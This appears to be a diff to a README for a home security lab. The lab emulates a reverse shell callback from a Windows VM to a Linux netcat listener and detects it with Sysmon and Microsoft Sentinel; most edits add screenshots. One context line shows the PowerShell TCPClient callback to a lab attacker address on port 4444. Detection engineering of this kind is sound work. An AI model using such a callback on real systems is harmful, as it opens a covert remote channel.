@@ -88,9 +88,7 @@ Sysmon was installed on the Windows victim VM to enable advanced telemetry colle
 
 SwiftOnSecurity Sysmon Config:
 
-```text
 https://github.com/SwiftOnSecurity/sysmon-config
-```
 
 ---
 
@@ -103,6 +101,10 @@ Azure Monitor Agent (AMA) was configured to ingest Sysmon Operational logs into 
 ```xpath
 Microsoft-Windows-Sysmon/Operational!*
 ```
+
+## Screenshot
+
+<img src="screenshots/sysmon-logs.png" width="80%">
 
 ---
 
@@ -127,6 +129,11 @@ IPAddress,Description
 192.168.56.101,Lab Persistence Simulation Node
 ```
 
+## Screenshot
+
+<img src="screenshots/w1.png" width="80%">
+<img src="screenshots/w2.png" width="80%">
+
 ---
 
 # 🐧 Step 4 — Attacker Listener Setup
@@ -146,6 +153,10 @@ This simulated:
 - Attacker-controlled infrastructure
 - C2 callback server
 
+## Screenshot
+
+<img src="screenshots/nc-listener.png" width="80%">
+
 ---
 
 # 🪟 Step 5 — Victim Callback Execution
@@ -158,9 +169,13 @@ The Windows victim VM initiated an outbound TCP callback connection to the Linux
 $client = New-Object System.Net.Sockets.TCPClient("10.0.0.5",4444)
 ```
 
+## Screenshot
+
+<img src="screenshots/connection-started.png" width="80%">
+
 ---
 
-# 📡 Result
+# 📡 Callback Result
 
 The Linux attacker VM successfully received the callback connection.
 
@@ -170,9 +185,15 @@ This generated:
 - Sentinel telemetry
 - Incident creation
 
+## Screenshot
+
+<img src="screenshots/connection-recieved.png" width="80%">
+
 ---
 
 # 🔎 Step 6 — Sysmon Telemetry Validation
+
+The generated network connection telemetry was validated inside Microsoft Sentinel.
 
 ## Validation Query
 
@@ -187,13 +208,9 @@ Event
 | sort by TimeGenerated desc
 ```
 
-## Observed Indicators
+## Screenshot
 
-| Indicator | Value |
-|---|---|
-| Destination IP | `10.0.0.5` |
-| Destination Port | `4444` |
-| Process | `powershell.exe` |
+<img src="screenshots/KQL-validation.png" width="80%">
 
 ---
 
@@ -204,14 +221,6 @@ Event
 ```text
 Potential Reverse Shell / C2 Callback Detection
 ```
-
-## Detection Logic
-
-The analytics rule detects:
-- Suspicious scripting engines
-- Outbound network communication
-- Uncommon destination ports
-- Connections to suspicious infrastructure
 
 ## Detection Query
 
@@ -246,6 +255,10 @@ Event
 | sort by TimeGenerated desc
 ```
 
+## Screenshot
+
+<img src="screenshots/AR.png" width="80%">
+
 ---
 
 # 🧬 MITRE ATT&CK Mapping
@@ -263,36 +276,9 @@ Event
 
 Microsoft Sentinel successfully generated an incident after detecting suspicious outbound callback behavior.
 
-## Detection Highlights
+## Screenshot
 
-- Suspicious outbound callback detected
-- PowerShell network communication observed
-- Connection to suspicious infrastructure identified
-- Behavioral + IOC-based detection logic triggered
-
----
-
-# 📸 Screenshots
-
-## Linux Attacker VM
-- [ ] Netcat listener active
-- [ ] Successful callback received
-
-## Windows Victim VM
-- [ ] PowerShell callback execution
-
-## Sentinel Logs
-- [ ] Sysmon Event ID 3 telemetry
-- [ ] Parsed destination IP & port
-
-## Sentinel Incident
-- [ ] Generated incident
-- [ ] Alert details
-- [ ] Entities
-
-## Analytics Rule
-- [ ] Detection query
-- [ ] MITRE ATT&CK mapping
+<img src="screenshots/Incident-created.png" width="80%">
 
 ---
 
@@ -312,13 +298,6 @@ Microsoft Sentinel successfully generated an incident after detecting suspicious
 # 🎯 Outcome
 
 This project successfully demonstrated a realistic reverse shell / command-and-control callback workflow using safe adversary emulation techniques.
-
-The simulation validated:
-- Advanced endpoint telemetry collection
-- Network-based attack detection
-- Behavioral analytics engineering
-- Threat intelligence enrichment
-- Automated incident generation in Microsoft Sentinel
 
 ---
 
